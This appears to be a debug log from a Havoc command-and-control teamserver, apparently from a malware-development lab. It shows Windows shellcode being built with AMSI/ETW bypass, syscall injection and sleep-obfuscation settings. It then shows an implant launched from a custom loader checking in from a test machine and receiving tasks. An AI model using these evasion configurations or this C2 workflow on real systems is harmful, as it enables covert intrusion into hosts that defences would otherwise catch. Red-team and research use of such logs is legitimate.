              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │      
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │      
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │      
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
    │/     \││/     \│   \_/   (_______)(_______/

  	 pwn and elevate until it's done

[06:37:18] [DBUG] [cmd.init.func2:59]: Debug mode enabled
[06:37:18] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
[06:37:18] [INFO] Havoc profile: ./profiles/havoc.yaotl
[06:37:18] [INFO] Build: 
 - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc
 - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc
 - Nasm         : /usr/bin/nasm
[06:37:18] [INFO] Time: 13/07/2024 06:37:18
[06:37:18] [INFO] Teamserver logs saved under: data/loot/2024.07.13._06:37:18
[06:37:18] [DBUG] [server.(*Teamserver).Start:53]: Starting teamserver...
[06:37:18] [INFO] Starting Teamserver on wss://0.0.0.0:40056
[06:37:18] [INFO] [SERVICE] starting service handle on wss://0.0.0.0:40056/service-endpoint
[06:37:18] [INFO] Opens existing database: data/teamserver.db
[06:37:18] [INFO] Starting 1 listeners from last session
[06:37:18] [DBUG] [certs.HTTPSGenerateRSACertificate:301]: Generating TLS certificate (RSA) for '0.0.0.0' ...
[06:37:18] [DBUG] [handlers.(*HTTP).Start:204]: Setup HTTP/s Server
[06:37:18] [INFO] Started "1" listener: http://192.168.17.137:80
[06:37:18] [INFO] Restored 4 agents from last session
[06:37:18] [DBUG] [server.(*Teamserver).Start:492]: Wait til the server shutdown
[06:37:18] [DBUG] [certs.generateCertificate:223]: Valid from 2024-06-14 06:37:18.52109654 -0400 EDT to 2027-06-14 06:37:18.52109654 -0400 EDT
[06:37:18] [DBUG] [certs.generateCertificate:228]: Serial Number: 49957320943267875301648256524098481421
[06:37:18] [DBUG] [certs.generateCertificate:234]: Authority certificate
[06:37:18] [DBUG] [certs.generateCertificate:247]: ExtKeyUsage = [1 2]
[06:37:18] [DBUG] [certs.generateCertificate:263]: Certificate authenticates IP address: 0.0.0.0
[06:37:18] [DBUG] [certs.generateCertificate:278]: Certificate is an AUTHORITY
[06:37:21] [DBUG] [server.(*Teamserver).ClientAuthenticate:658]: Found User: 5pider
[06:37:21] [DBUG] [server.(*Teamserver).ClientAuthenticate:665]: User 5pider is authenticated
[06:37:21] [GOOD] User <5pider> Authenticated
[06:37:21] [ERRO] Error reading : read tcp 192.168.17.137:40056->192.168.17.137:56600: read: connection reset by peer
[06:37:21] [ERRO] Socket Error: tls: failed to send closeNotify alert (but connection was closed anyway): write tcp 192.168.17.137:40056->192.168.17.137:56600: write: broken pipe
[06:37:28] [DBUG] [server.(*Teamserver).ClientAuthenticate:658]: Found User: 5pider
[06:37:28] [DBUG] [server.(*Teamserver).ClientAuthenticate:665]: User 5pider is authenticated
[06:37:28] [GOOD] User <5pider> Authenticated
[06:37:35] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
[06:37:35] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rbx Sleep Technique:Foliage Stack Duplication:false]
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:971]: 
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:982]: 
[06:37:35] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/bc665fd240/6640587abb.o
[06:37:35] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/bc665fd240/1d4bd2f348.o
[06:37:35] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
[06:37:35] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
[06:37:35] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rbx Sleep Technique:Foliage Stack Duplication:false]
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:971]: 
[06:37:35] [DBUG] [builder.(*Builder).PatchConfig:982]: 
[06:37:35] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/05e8659f10/a7adce639a.o
[06:37:35] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/05e8659f10/de18be4020.o
[06:37:35] [DBUG] [builder.(*Builder).Build:379]: Compile dll
[06:38:30] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
[06:39:00] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
[06:39:00] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 761e4df6
[06:39:00] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (761e4df6) == DemonID (761e4df6)

[06:39:00] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
Hostname: WINDEV2401EVAL
Username: User
Domain  : 
InternIP: 192.168.17.131
ExternIP: 192.168.17.131

[06:39:00] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
ProcessPID  : 18420
ProcessTID  : 14392
ProcessPPID : 0
ProcessArch : 2
Elevated    : 0
Base Address: 0x193921b0000

[06:39:00] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
SleepDelay  : 2
SleepJitter : 15

[06:39:00] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
[06:39:00] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
[06:39:00] [DBUG] [handlers.handleDemonAgent:295]: Finished request
[06:39:11] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 761e4df6, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
[06:39:11] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 761e4df6, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: ffeef022
[06:39:11] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 761e4df6, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: f30fa406
[06:39:11] [DBUG] [agent.(*Agent).TaskDispatch:3375]: Agent: 761e4df6, Command: BEACON_OUTPUT - CALLBACK_OUTPUT
[06:39:11] [DBUG] [agent.(*Agent).TaskDispatch:3998]: Agent: 761e4df6, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_RAN_OK
